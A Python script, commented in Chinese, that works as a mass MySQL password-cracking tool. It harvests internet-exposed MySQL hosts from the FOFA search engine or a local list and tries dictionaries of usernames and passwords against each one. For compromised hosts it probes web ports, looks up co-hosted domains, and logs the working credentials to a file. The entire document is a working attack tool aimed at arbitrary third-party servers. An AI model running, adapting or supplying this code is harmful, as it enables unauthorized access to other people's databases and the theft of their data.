# -*- coding: utf-8 -*-#
# -------------------------------
# MySQL爆破与web探测
# Author:说书人
# 公众号：台下言书
# Date:2020/2/7 9:10
# 支持从fofa抓取或者本地导入
# 对存在弱口令的ip进行web服务探测
# -------------------------------

import pymysql
import requests
import eventlet
import sys

import time
from bs4 import BeautifulSoup


def start():#初始化加载字典
    username=[]
    password=[]
    with open("{}/config/user.txt".format(sys.path[0]), "r") as f:
        for line in f.readlines():
            line = line.strip('\n')
            username.append(line)
    with open("{}/config/pass.txt".format(sys.path[0]), "r") as f:
        for line in f.readlines():
            line = line.strip('\n')
            password.append(line)
    print("初始化成功，用户名:{}个   密码:{}个".format(str(len(username)),str(len(password))))
    return username,password

def request(url):#抓取fofa
    cookie = open("{}/config/cookie.txt".format(sys.path[0]), 'r')
    headers = {
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
        "Cookie": cookie.read()
    }
    cookie.close()
    response = requests.get(url,headers=headers)
    response.raise_for_status()  # 失败请求(非200响应)抛出异常
    response.encoding = "utf-8"
    html = response.text
    response.close()
    return html

def get_ip(html):#清洗数据，取出ip
    html = BeautifulSoup(html, "html.parser")  # 创建 beautifulsoup 对象
    for tag in html.find_all('div', class_="ip-no-url"):
        ip_list.append(tag.string.replace("\n", "").replace(" ", ""))
    return ip_list


def Crack_mysql(ip_list,username,password):#对mysql进行爆破
    mysql_good=[]
    ip_good=[]
    for ip in ip_list:
        for u in username:
            for p in password:
                eventlet.monkey_patch()
                with eventlet.Timeout(6, False):  # 设置超时时间为6秒
                    try:
                        db = pymysql.connect(ip, u, p)  # 连接数据库参数：ip,user,pass
                        db.close()
                        mysql_good.append("mysql:\n{}|{}|{}".format(ip,u,p))
                        ip_good.append(ip)
                        print("{}存在弱口令".format(ip))
                    except:
                        print("Test for {}|{}|{}   Flase".format(ip,u,p))


    return mysql_good,ip_good

def get_webserver(ip_good):#web服务探测
    web_list=[]

    #通过ip+端口判断
    port_list=['80','8080','81','8888']
    for ip in ip_good:
        web = []
        for port in port_list:
            try:
                url = "http://{}:{}/".format(ip, port)
                response = requests.get(url)
                response.raise_for_status()  # 失败请求(非200响应)抛出异常
                print("{}存在".format(url))
                web.append(url)
            except:
                print("{}不是web服务，丢弃".format(url))
    #通过站长网ip反查域名
        try:
            response = requests.get("http://s.tool.chinaz.com/same?s={}".format(ip))
            response.raise_for_status()
            response.encoding = "utf-8"
        except:
            print("ip反查域名出现异常")
        try:
            html = BeautifulSoup(response.text, "html.parser")
            for tag in html.find_all('li', class_="ReListCent ReLists item clearfix"):
                for url in tag.find_all('a'):
                    web.append(url.string)
            for tag in html.find_all('li', class_="ReListCent ReLists item bg-list clearfix"):
                for url in tag.find_all('a'):
                    web.append(url.string)
            print("同服检测完毕")
        except:
            web.append("无同服站点")
        web_list.append(web)
    print("探测完毕...")
    return web_list

def write_txt(mysql_good,web_server):#将最终结果写入txt
    with open("{}/good.txt".format(sys.path[0]), "a") as file:
        for i in range(len(mysql_good)):
            file.write("{}\n".format(mysql_good[i]))
            file.write("探测到的web：\n")
            for web in web_server[i]:
                file.write("{}\n".format(web))
            file.write("-----------------------------\n")
    print("写入数据")


#加载字典
dict_tup=start()
username=list(dict_tup[0])
password=list(dict_tup[1])
#选择资产来源
ip_list = []
print("资产获取方式：1.fofa抓取    2.本地获取")
type=input("请选择：")
if type=="1":
    ip_list = []
    #从fofa爬取
    page = input("请输入抓取页数：")
    for i in range(int(page)):
        page_num = str(i + 1)
        print("从fofa上抓取第{}页中...".format(page_num))
        url = "https://fofa.so/result?page={}&qbase64=cG9ydD0iMzMwNiIgJiYgcHJvdG9jb2w9PSJteXNxbCI%3D".format(page_num)
        html = request(url)
        get_ip(html)
        #print(html)
        time.sleep(5)#如果抓取页数太多的话，建议加个延时，不然waf会ban
elif type=="2":
    ip_list = []
    with open("{}/config/ip.txt".format(sys.path[0]), 'r') as f:
        for line in f:
            ip_list.append(line.strip('\n'))
else:
    print("输入参数错误，告辞")
    exit()
print(ip_list)
if int(page)>=2 and len(ip_list)==10:
    print("只抓取了第1页，可能登录cookie已过期")
    iscontinue=input("是否继续?(y/N)")
    if iscontinue!='y':
        print('程序退出')
        exit()
if int(page)>5 and len(ip_list)==50:
    print("只能抓取前5页，除非你开个fofa会员...")
tmp_list=[ip_list[i:i + 10] for i in range(0, len(ip_list), 10)]
for i in range(len(tmp_list)):
    print("第{}波开始爆破...".format(str(i+1)))
    good_tup=Crack_mysql(tmp_list[i],username,password)
    mysql_good=list(good_tup[0])#mysql爆破成功的结果
    ip_good=list(good_tup[1])
    web_server=get_webserver(ip_good)#web服务探测结果
    write_txt(mysql_good,web_server)
print("程序运行结束")